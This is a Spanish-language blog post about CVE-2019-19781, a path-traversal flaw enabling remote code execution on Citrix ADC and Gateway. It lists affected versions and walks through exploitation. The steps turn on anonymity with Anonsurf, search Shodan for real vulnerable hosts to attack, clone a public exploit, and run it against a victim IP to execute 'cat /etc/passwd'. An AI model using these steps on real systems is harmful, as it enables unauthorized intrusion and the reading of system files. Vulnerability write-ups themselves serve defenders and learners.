---
layout: single
title: Explotación de CVE-2019-19781 - Vulnerabilidades
excerpt: "Una vulnerabilidad de cruce de directorio de Citrix Application Delivery Controller (ADC) y Gateway, que puede llevar a la ejecución remota de código sin credenciales."
date: 2023-08-25
classes: wide
header:
  teaser: /assets/images/vulnerabilidades/cve-2019-0708/cve-2019-19781.png
  teaser_home_page: true
  icon: /assets/images/citrix.webp
categories:
  - Vulnerabilidades
 
tags:  
  - cve-2019-19781
  - Citrix
  - Shodan
  - exploit-db
  
---

![](/assets/images/vulnerabilidades/cve-2019-0708/cve-2019-19781.png)

## Descripción:

La vulnerabilidad CVE-2019-19781 corresponde con un ataque de directorio transversal que permitía a un atacante ejecutar de forma remota código arbitrario en varias versiones de los productos ADC y Gateway de Citrix, así como en versiones antiguas de Citrix SD-WAN WANOP.

Está valorada como crítica, con una puntuación de 9.8 y fue descubierta por el investigador Mikhail Klyuchnikov, trabajador de la empresa Positive Technologies, quien reportó de manera ética la incidencia siguiendo el procedimiento de publicación responsable aplicable en estos casos.

•	Tipo: Limitación incorrecta de nombre de ruta a un directorio restringido (Path Traversal)

•	Gravedad: Alta

•	Fecha publicación: 27/12/2019

•	Última modificación: 08/01/2020

## Productos Afectados:

•	Citrix ADC y Citrix Gateway versión 13.0 todas las compilaciones compatibles

•	Citrix ADC y NetScaler Gateway versión 12.1 todas las compilaciones compatibles

•	Citrix ADC y NetScaler Gateway versión 12.0 todas las compilaciones compatibles

•	Citrix ADC y NetScaler Gateway versión 11.1 todas las compilaciones compatibles

•	Citrix NetScaler ADC y NetScaler Gateway versión 10.5 todas las compilaciones compatibles
 
## Explotación:

Para esta explotaciòn vamos a utilizar una maquina con sistema operativo Kali Linux. Como primera medida vamos a iniciar el anunsurf para manejar el anonimato

•	Anonsurf start

![](/assets/images/vulnerabilidades/cve-2019-0708/cve-2019-197811.png)

Buscamos en la página Expoit Database, un exploit referente a la vulnerabilidad.

•	https://www.exploit-db.com/

![](/assets/images/vulnerabilidades/cve-2019-0708/cve-2019-197812.png)

En la página de Shodan buscamos equipos con esta vulnerabilidad para ser vulnerados.

•	https://www.shodan.io/

![](/assets/images/vulnerabilidades/cve-2019-0708/cve-2019-197813.png)

Se realiza la clonación del repositorio del exploit desde la página de GitHub.

•	Git clone https://github.com/projectzeroindia/CVE-2019-19781

![](/assets/images/vulnerabilidades/cve-2019-0708/cve-2019-197814.png)

Ingresamos al directorio del Exploit descargado.

![](/assets/images/vulnerabilidades/cve-2019-0708/cve-2019-197815.png)

Dentro del directorio ejecutamos el siguiente comando.

•	python3 cve-2019-19781_scanner.py <IP DE LA VICTIMA> <PUERTO>

![](/assets/images/vulnerabilidades/cve-2019-0708/cve-2019-197816.png)

Finalmente se evidencia que fue vulnerable y lista los directorios del dispositivo.

![](/assets/images/vulnerabilidades/cve-2019-0708/cve-2019-197817.png)

Probamos ejecutando otro comando.

•	bash CVE-2019-19781.sh <IP VICTIMA> 'cat /etc/passwd'

![](/assets/images/vulnerabilidades/cve-2019-0708/cve-2019-197818.png)


## Referencias:

•	https://nvd.nist.gov/vuln/detail/CVE-2019-19781

•	https://support.citrix.com/article/CTX267679

•	https://www.exploit-db.com/exploits/47913



